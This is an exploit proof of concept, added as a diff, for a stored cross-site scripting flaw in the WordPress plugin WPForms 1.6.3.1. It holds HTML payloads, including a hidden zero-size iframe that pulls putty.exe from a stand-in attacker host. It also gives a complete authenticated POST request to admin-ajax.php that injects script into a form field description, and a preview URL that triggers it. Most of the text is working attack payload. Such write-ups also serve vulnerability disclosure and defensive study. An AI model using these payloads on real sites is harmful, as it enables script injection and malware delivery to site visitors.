@@ -1,0 +1,44 @@
+#Exploit Title : Wordpress Plugin WPForms 1.6.3.1 - Persistent Cross Site Scripting (Authenticated)
+#Exploit Author : ZwX
+#Exploit Date : 2020-10-23
+#Vendor Homepage : https://wpforms.com/
+#Download Plugin : https://downloads.wordpress.org/plugin/wpforms-lite.1.6.3.1.zip
+
+
+[+] Description Vulnerability:
+==============================
+
+A Cross Site Scripting vulnerability is located in the Wordpress plugin [WPForms] which affects version 1.6.3.1 and other versions lower.
+To exploit the vulnerability it is necessary to be identified, the attacker could hide JavaScript code without the knowledge of the owner of the site.
+ 
+
+[+] Proof Of Concept:
+=====================
+
+# HTML Code #
+
+<textarea class="" id="wpforms-field-option-0-description" name="fields[0][description]" rows="3"><script>alert(1)</script></textarea>
+<textarea class="" id="wpforms-field-option-0-description" name="fields[0][description]" rows="3"><iframe src="https://Attacker.com/putty.exe" style="width:0;height:0;border:0; border:none;/></textarea>
+
+
+# Methode POST #
+
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/wp-admin/admin.php?page=wpforms-builder&view=fields&form_id=990
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 7081
+Origin: http://localhost
+Connection: close
+
+action=wpforms_save_form&data=[{"name":"id","value":"990"},{"name":"field_id","value":"5"},{"name":"fields[0][id]","value":"0"},{"name":"fields[0][type]","value":"name"},{"name":"fields[0][label]","value":"Nom"},{"name":"fields[0][format]","value":"first-last"},{"name":"fields[0][description]","value":"<script>alert(1)</script>"},{"name":"fields[0][required]","value":"1"},{"name":"fields[0][size]","value":"medium"},{"name":"fields[0][simple_placeholder]","value":""},{"name":"fields[0][simple_default]","value":""},{"name":"fields[0][first_placeholder]","value":""},{"name":"fields[0][first_default]","value":""},{"name":"fields[0][middle_placeholder]","value":""},{"name":"fields[0][middle_default]","value":""},{"name":"fields[0][last_placeholder]","value":""},{"name":"fields[0][last_default]","value":""},{"name":"fields[0][css]","value":""},{"name":"fields[1][id]","value":"1"},{"name":"fields[1][type]","value":"email"},{"name":"fields[1][label]","value":"E-mail"},{"name":"fields[1][description]","value":""},{"name":"fields[1][required]","value":"1"},{"name":"fields[1][size]","value":"medium"},{"name":"fields[1][placeholder]","value":""},{"name":"fields[1][confirmation_placeholder]","value":""},{"name":"fields[1][default_value]","value":""},{"name":"fields[1][css]","value":""},{"name":"fields[1][filter_type]","value":""},{"name":"fields[1][allowlist]","value":""},{"name":"fields[1][denylist]","value":""},{"name":"fields[2][id]","value":"2"},{"name":"fields[2][type]","value":"textarea"},{"name":"fields[2][label]","value":"Commentaire ou message"},{"name":"fields[2][description]","value":""},{"name":"fields[2][required]","value":"1"},{"name":"fields[2][size]","value":"medium"},{"name":"fields[2][placeholder]","value":""},{"name":"fields[2][limit_count]","value":"1"},{"name":"fields[2][limit_mode]","value":"characters"},{"name":"fields[2][default_value]","value":""},{"name":"fields[2][css]","value":""},{"name":"fields[3][id]","value":"3"},{"name":"fields[3][type]","value":"textarea"},{"name":"fields[3][label]","value":"Paragraphe"},{"name":"fields[3][description]","value":""},{"name":"fields[3][size]","value":"medium"},{"name":"fields[3][placeholder]","value":""},{"name":"fields[3][limit_count]","value":"1"},{"name":"fields[3][limit_mode]","value":"characters"},{"name":"fields[3][default_value]","value":""},{"name":"fields[3][css]","value":""},{"name":"fields[4][id]","value":"4"},{"name":"fields[4][type]","value":"textarea"},{"name":"fields[4][label]","value":"Paragraphe"},{"name":"fields[4][description]","value":""},{"name":"fields[4][size]","value":"medium"},{"name":"fields[4][placeholder]","value":""},{"name":"fields[4][limit_count]","value":"1"},{"name":"fields[4][limit_mode]","value":"characters"},{"name":"fields[4][default_value]","value":""},{"name":"fields[4][css]","value":""},{"name":"settings[form_title]","value":"Formulaire de contact simple"},{"name":"settings[form_desc]","value":""},{"name":"settings[form_class]","value":""},{"name":"settings[submit_text]","value":"Envoyer"},{"name":"settings[submit_text_processing]","value":"Envoi..."},{"name":"settings[submit_class]","value":""},{"name":"settings[antispam]","value":"1"},{"name":"settings[notification_enable]","value":"1"},{"name":"settings[notifications][1][email]","value":"{admin_email}"},{"name":"settings[notifications][1][subject]","value":"Nouvelle entrée : Formulaire de contact simple"},{"name":"settings[notifications][1][sender_name]","value":"Le Blog de ZwX"},{"name":"settings[notifications][1][sender_address]","value":"{admin_email}"},{"name":"settings[notifications][1][replyto]","value":"{field_id=\"1\"}"},{"name":"settings[notifications][1][message]","value":"{all_fields}"},{"name":"settings[confirmations][1][type]","value":"message"},{"name":"settings[confirmations][1][message]","value":"<p>Merci de nous avoir contacté ! Nous vous contacterons rapidement.</p>"},{"name":"settings[confirmations][1][message_scroll]","value":"1"},{"name":"settings[confirmations][1][page]","value":"262"},{"name":"settings[confirmations][1][redirect]","value":""}]&id=990&nonce=ec15a26a5a
+
+
+# URL Proof Of Concept #
+
+http://localhost/?wpforms_form_preview=990
